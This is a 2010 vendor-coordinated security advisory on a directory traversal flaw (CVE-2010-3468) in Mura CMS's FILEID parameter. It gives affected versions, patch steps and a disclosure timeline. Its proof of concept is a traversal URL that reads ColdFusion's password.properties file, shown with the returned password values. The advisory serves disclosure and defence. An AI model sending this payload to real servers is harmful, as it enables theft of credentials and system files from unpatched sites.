@@ -1,0 +1,110 @@
+Sep 24, 2010
+
+
+    * Title: Blue River Mura CMS Directory Traversal
+    * Version: 1.0
+    * Issue type: Directory Traversal
+    * Affected vendor: Blue River Interactive Group
+    * Release date: 24/09/2010
+    * Discovered by:  Steven Seeley & Rohan Stelling
+
+Summary
+
+Mura CMS is an open source content management system which is built upon the Adobe Cold Fusion platform.
+
+stratsec researchers Rohan Stelling and Steven Seeley have identified an arbitrary file download issue in the Mura CMS as distributed by BlueRiver Interactive Group. The issue permits access to local files on the server.
+
+As a result the vendor has released a patch addressing the issue and notified their customer base. stratsec would like to acknowledge the speedy response time by Blue River Interactive Group, producing a patch within 48 hours of notification.
+
+Description
+
+The ‘fileManager.cfc’ component present in affected Mura CMS versions does not correctly sanitise the ‘FILEID’ parameter before using the parameter to form file paths. As a result it possible for an attacker to supply malicious input which causes a different file to be accessed other than that intended.
+
+Impact
+
+The issue permits an unauthenticated attacker to download arbitrary files from a system exposing an unpatched Mura CMS version. This issue may result in the unauthorised disclosure of sensitive user or system files.
+
+Affected products
+
+ 
+
+    * Mura CMS 5.1 < 5.1.498
+    * Mura CMS 5.2 < 5.2.2809
+    * Sava CMS 5.2 (Unknown)
+
+
+Proof of concept
+
+Files can be retrieved from the server using a specially crafted URI such as the one given below,
+Page: /tasks/render/file/
+Parameter: FILEID
+Request Type: GET
+PoC: http://{hostname}/{mura_ _location}/tasks/render/file/?FILEID=..\..\..\..\..\..\ColdFusion9\lib\password.properties
+
+The resulting HTTP request looks
+
+GET /www/tasks/render/file/?FILEID=..\..\..\..\..\..\ColdFusion9\lib\password.properties HTTP/1.1
+
+The payload will needs to be modified to reference a file on the system, relative to the installation path.
+Upon receiving such a request, the server responds with a 200 OK containing the file specified. For the PoC above (retrieving ‘password.properties’) the server returned the following response:
+
+HTTP/1.0 200 OK
+Connection: close
+Content-Disposition: inline;filename=""
+Content-Type: /
+Content-Length: 141
+
+#Thu Aug 26 11:24:03 EST 2010
+rdspassword=09GTH9 8O&>36& \\Q>[K\=XP  \n
+password=5BAA61E4C9B93F3F0682250B6CF8331B7EE68FD8
+encrypted=true
+
+Solution
+
+The vendor has provided patches and upgrade instructions which are available from http://www.getmura.com/index.cfm/blog/critical-security-patch/.
+
+Using the Mura CMS auto-updater
+
+ 
+
+    * 1. Login to the Mura admin with an account that has super user rights.
+    * 2. Once logged in, click the "Site Settings" Link located in the top right of the Mura CMS admin screens.
+    * 3. On the main "Site Settings" page that shows the list all of site currently running in your Mura CMS instance click "Update Core Files to Latest Version".
+    * 4. Click "Reload Application" in the Mura CMS admin left module nav.
+
+
+Without the auto updater
+
+Download appropriate software patch and follow the upgrade instructions contained in the ReadMe.txt file.
+ 
+
+    * Sava 5
+      http://www.getmura.com/tasks/sites/v5/assets/File/sava5SecurityPatch1.zip
+    * Mura CMS 5.1
+      http://www.getmura.com/tasks/sites/v5/assets/File/mura51SecurityPatch1.zip
+    * Mura CMS 5.2
+      http://www.getmura.com/tasks/sites/v5/assets/File/mura52SecurityPatch1.zip
+
+
+Response timeline
+
+ 
+
+    * 07/09/2010 - Vendor notified.
+    * 09/09/2010 - Vendor acknowledges receipt of advisory.
+    * 10/09/2010 - Vendor confirms issue presence.
+    * 11/09/2010 - Fix released and vendor notifies paid support customers.
+    * 11/09/2010 - stratsec confirms patch resolves issue.
+    * 11/09/2010 - Advisory publication date agreed as 25/09/2010
+    * 15/09/2010 – Vendor publishes a blog post publicly disclosing the vulnerabilities presence.
+    * 25/09/2010 - This advisory published.
+
+
+References
+
+ 
+
+    * Vendor advisory: http://www.getmura.com/index.cfm/blog/critical-security-patch/
+    * CVE item: CVE-2010-3468
+
+ 		 	   		  
